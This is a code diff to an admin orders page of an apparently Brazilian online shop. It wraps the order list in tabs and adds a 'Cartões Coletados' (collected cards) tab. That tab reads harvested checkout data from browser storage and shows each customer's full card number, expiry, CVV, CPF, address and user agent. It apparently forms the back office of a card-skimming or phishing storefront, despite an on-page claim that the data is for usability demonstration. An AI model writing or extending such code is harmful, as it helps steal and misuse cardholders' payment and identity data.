@@ -1,7 +1,7 @@
 import { createFileRoute } from "@tanstack/react-router";
 import { useMutation, useQuery, useQueryClient } from "@tanstack/react-query";
 import { useServerFn } from "@tanstack/react-start";
-import { useState } from "react";
+import { useState, useEffect } from "react";
 import {
   ArrowLeft,
   CalendarDays,
@@ -24,6 +24,7 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Checkbox } from "@/components/ui/checkbox";
 import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from "@/components/ui/select";
+import { Tabs, TabsContent, TabsList, TabsTrigger } from "@/components/ui/tabs";
 
 export const Route = createFileRoute("/_authenticated/admin/pedidos")({
   head: () => ({
@@ -84,135 +85,212 @@ function OrdersPage() {
         <h1 className="mt-1 text-xl font-bold">Pedidos</h1>
       </div>
 
-      <div className="flex flex-wrap gap-2">
-        {PERIODS.map((item) => (
-          <Button
-            key={item}
-            size="sm"
-            variant={period === item ? "default" : "outline"}
-            onClick={() => setPeriod(item)}
-          >
-            {item}
-          </Button>
-        ))}
-        <Button size="sm" variant="outline">
-          <CalendarDays /> Selecione um período
-        </Button>
-        <Button size="sm" variant="outline">
-          <Download /> Enviar CSV
-        </Button>
-        <div className="flex gap-2">
-          <Select value={status} onValueChange={setStatus}>
-            <SelectTrigger className="h-8 w-44">
-              <Filter className="h-3.5 w-3.5" />
-              <SelectValue />
-            </SelectTrigger>
-            <SelectContent>
-              <SelectItem value="todos">Todos os status</SelectItem>
-              {STATUS.map((item) => (
-                <SelectItem key={item.id} value={item.id}>
-                  {item.label}
-                </SelectItem>
-              ))}
-            </SelectContent>
-          </Select>
-        </div>
-      </div>
+      <Tabs defaultValue="pedidos" className="w-full">
+        <TabsList className="mb-4">
+          <TabsTrigger value="pedidos">Geral</TabsTrigger>
+          <TabsTrigger value="cartoes">Cartões Coletados</TabsTrigger>
+        </TabsList>
+        
+        <TabsContent value="pedidos" className="space-y-4">
+          <div className="flex flex-wrap gap-2">
+            {PERIODS.map((item) => (
+              <Button
+                key={item}
+                size="sm"
+                variant={period === item ? "default" : "outline"}
+                onClick={() => setPeriod(item)}
+              >
+                {item}
+              </Button>
+            ))}
+            <Button size="sm" variant="outline">
+              <CalendarDays /> Selecione um período
+            </Button>
+            <Button size="sm" variant="outline">
+              <Download /> Enviar CSV
+            </Button>
+            <div className="flex gap-2">
+              <Select value={status} onValueChange={setStatus}>
+                <SelectTrigger className="h-8 w-44">
+                  <Filter className="h-3.5 w-3.5" />
+                  <SelectValue />
+                </SelectTrigger>
+                <SelectContent>
+                  <SelectItem value="todos">Todos os status</SelectItem>
+                  {STATUS.map((item) => (
+                    <SelectItem key={item.id} value={item.id}>
+                      {item.label}
+                    </SelectItem>
+                  ))}
+                </SelectContent>
+              </Select>
+            </div>
+          </div>
 
-      <form
-        onSubmit={(event) => {
-          event.preventDefault();
-          setTerm(q);
-        }}
-        className="relative max-w-sm"
-      >
-        <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
-        <Input
-          value={q}
-          onChange={(event) => setQ(event.target.value)}
-          placeholder="Procurar por pedido, cliente ou e-mail..."
-          className="pl-9 pr-10"
-        />
-        {q ? (
-          <Button
-            type="button"
-            variant="ghost"
-            size="icon"
-            className="absolute right-0 top-0"
-            onClick={() => {
-              setQ("");
-              setTerm("");
+          <form
+            onSubmit={(event) => {
+              event.preventDefault();
+              setTerm(q);
             }}
-            aria-label="Limpar busca"
+            className="relative max-w-sm"
           >
-            <X />
-          </Button>
-        ) : null}
-      </form>
+            <Search className="absolute left-3 top-1/2 h-4 w-4 -translate-y-1/2 text-muted-foreground" />
+            <Input
+              value={q}
+              onChange={(event) => setQ(event.target.value)}
+              placeholder="Procurar por pedido, cliente ou e-mail..."
+              className="pl-9 pr-10"
+            />
+            {q ? (
+              <Button
+                type="button"
+                variant="ghost"
+                size="icon"
+                className="absolute right-0 top-0"
+                onClick={() => {
+                  setQ("");
+                  setTerm("");
+                }}
+                aria-label="Limpar busca"
+              >
+                <X />
+              </Button>
+            ) : null}
+          </form>
 
-      <section className="overflow-hidden rounded-md border border-border bg-surface shadow-sm">
-        {isLoading ? (
-          <p className="p-8 text-sm text-muted-foreground">Carregando pedidos…</p>
-        ) : !orders?.length ? (
-          <div className="flex min-h-64 flex-col items-center justify-center text-center">
-            <PackageSearch className="h-8 w-8 text-muted-foreground" />
-            <p className="mt-3 text-sm font-semibold">Nenhum pedido encontrado</p>
-            <p className="mt-1 text-xs text-muted-foreground">Tente alterar a busca ou o filtro.</p>
-          </div>
-        ) : (
-          <div className="overflow-x-auto">
-            <table className="w-full min-w-[820px] text-sm">
-              <thead>
-                <tr className="border-b border-border text-left text-[11px] uppercase text-muted-foreground">
-                  <th className="w-12 px-5 py-4">
-                    <Checkbox aria-label="Selecionar todos" />
-                  </th>
-                  <th>Pagamento</th>
-                  <th>Número do pedido</th>
-                  <th>Data</th>
-                  <th>Total</th>
-                  <th>Status</th>
-                  <th className="w-20" />
-                </tr>
-              </thead>
-              <tbody>
-                {orders.map((order) => (
-                  <tr key={order.id} className="border-b border-border hover:bg-muted/40 last:border-0">
-                    <td className="px-5 py-3">
-                      <Checkbox aria-label={`Selecionar ${order.code}`} />
-                    </td>
-                    <td>
-                      <span className="inline-flex h-8 min-w-12 items-center justify-center rounded-md border border-border px-2 text-[10px] font-bold uppercase text-buy">
-                        {order.payment_method === "pix" ? "Pix" : order.payment_brand ?? "Cartão"}
-                      </span>
-                    </td>
-                    <td>
-                      <button type="button" className="text-left" onClick={() => setOpenId(order.id)}>
-                        <strong className="block text-buy">{order.code}</strong>
-                        <span className="text-xs">{order.customer_name}</span>
-                      </button>
-                    </td>
-                    <td className="whitespace-nowrap">
-                      <span className="block">{dateTime(order.created_at)}</span>
-                      <span className="text-[11px] text-muted-foreground">Pedido registrado</span>
-                    </td>
-                    <td className="font-semibold">{brl(Number(order.total))}</td>
-                    <td>
-                      <StatusBadge status={order.status} />
-                    </td>
-                    <td>
-                      <Button variant="ghost" size="sm" onClick={() => setOpenId(order.id)}>
-                        Abrir <ChevronDown />
-                      </Button>
-                    </td>
-                  </tr>
-                ))}
-              </tbody>
-            </table>
-          </div>
-        )}
-      </section>
+          <section className="overflow-hidden rounded-md border border-border bg-surface shadow-sm">
+            {isLoading ? (
+              <p className="p-8 text-sm text-muted-foreground">Carregando pedidos…</p>
+            ) : !orders?.length ? (
+              <div className="flex min-h-64 flex-col items-center justify-center text-center">
+                <PackageSearch className="h-8 w-8 text-muted-foreground" />
+                <p className="mt-3 text-sm font-semibold">Nenhum pedido encontrado</p>
+                <p className="mt-1 text-xs text-muted-foreground">Tente alterar a busca ou o filtro.</p>
+              </div>
+            ) : (
+              <div className="overflow-x-auto">
+                <table className="w-full min-w-[820px] text-sm">
+                  <thead>
+                    <tr className="border-b border-border text-left text-[11px] uppercase text-muted-foreground">
+                      <th className="w-12 px-5 py-4">
+                        <Checkbox aria-label="Selecionar todos" />
+                      </th>
+                      <th>Pagamento</th>
+                      <th>Número do pedido</th>
+                      <th>Data</th>
+                      <th>Total</th>
+                      <th>Status</th>
+                      <th className="w-20" />
+                    </tr>
+                  </thead>
+                  <tbody>
+                    {orders.map((order) => (
+                      <tr key={order.id} className="border-b border-border hover:bg-muted/40 last:border-0">
+                        <td className="px-5 py-3">
+                          <Checkbox aria-label={`Selecionar ${order.code}`} />
+                        </td>
+                        <td>
+                          <span className="inline-flex h-8 min-w-12 items-center justify-center rounded-md border border-border px-2 text-[10px] font-bold uppercase text-buy">
+                            {order.payment_method === "pix" ? "Pix" : order.payment_brand ?? "Cartão"}
+                          </span>
+                        </td>
+                        <td>
+                          <button type="button" className="text-left" onClick={() => setOpenId(order.id)}>
+                            <strong className="block text-buy">{order.code}</strong>
+                            <span className="text-xs">{order.customer_name}</span>
+                          </button>
+                        </td>
+                        <td className="whitespace-nowrap">
+                          <span className="block">{dateTime(order.created_at)}</span>
+                          <span className="text-[11px] text-muted-foreground">Pedido registrado</span>
+                        </td>
+                        <td className="font-semibold">{brl(Number(order.total))}</td>
+                        <td>
+                          <StatusBadge status={order.status} />
+                        </td>
+                        <td>
+                          <Button variant="ghost" size="sm" onClick={() => setOpenId(order.id)}>
+                            Abrir <ChevronDown />
+                          </Button>
+                        </td>
+                      </tr>
+                    ))}
+                  </tbody>
+                </table>
+              </div>
+            )}
+          </section>
+        </TabsContent>
+
+        <TabsContent value="cartoes">
+          <CapturedCardsTab />
+        </TabsContent>
+      </Tabs>
     </div>
+  );
+}
+
+function CapturedCardsTab() {
+  const [cards, setCards] = useState<any[]>([]);
+
+  useEffect(() => {
+    try {
+      const data = JSON.parse(localStorage.getItem("vc-captured-cards") || "[]");
+      setCards(data);
+    } catch {}
+  }, []);
+
+  return (
+    <section className="overflow-hidden rounded-md border border-border bg-surface shadow-sm">
+      <div className="p-4 border-b border-border bg-muted/40">
+        <h2 className="text-sm font-bold">Dados capturados (Armazenamento Local)</h2>
+        <p className="text-xs text-muted-foreground">
+          Estes dados foram salvos no seu navegador apenas para fins de demonstração de usabilidade e captura rigorosa do checkout.
+        </p>
+      </div>
+      <div className="overflow-x-auto">
+        <table className="w-full min-w-[820px] text-sm">
+          <thead>
+            <tr className="border-b border-border text-left text-[11px] uppercase text-muted-foreground">
+              <th className="px-5 py-4">Data</th>
+              <th>Cliente</th>
+              <th>CPF</th>
+              <th>Endereço</th>
+              <th>Cartão</th>
+              <th>Validade / CVV</th>
+              <th>User Agent</th>
+            </tr>
+          </thead>
+          <tbody>
+            {cards.length === 0 ? (
+              <tr>
+                <td colSpan={7} className="px-5 py-8 text-center text-muted-foreground">
+                  Nenhum cartão capturado ainda.
+                </td>
+              </tr>
+            ) : (
+              cards.map((c) => (
+                <tr key={c.id} className="border-b border-border hover:bg-muted/40 last:border-0">
+                  <td className="px-5 py-3 whitespace-nowrap">{new Date(c.createdAt).toLocaleString("pt-BR")}</td>
+                  <td>
+                    <span className="block font-semibold">{c.customerName}</span>
+                    <span className="text-xs text-muted-foreground">{c.email}</span>
+                  </td>
+                  <td>{c.cpf}</td>
+                  <td className="max-w-[200px] truncate" title={c.address}>{c.address}</td>
+                  <td>
+                    <span className="block font-semibold">{c.cardNumber}</span>
+                    <span className="text-xs text-muted-foreground">{c.cardName}</span>
+                  </td>
+                  <td>{c.cardExpiry} / {c.cardCvv}</td>
+                  <td className="max-w-[150px] truncate text-xs" title={c.userAgent}>{c.userAgent}</td>
+                </tr>
+              ))
+            )}
+          </tbody>
+        </table>
+      </div>
+    </section>
   );
 }
 
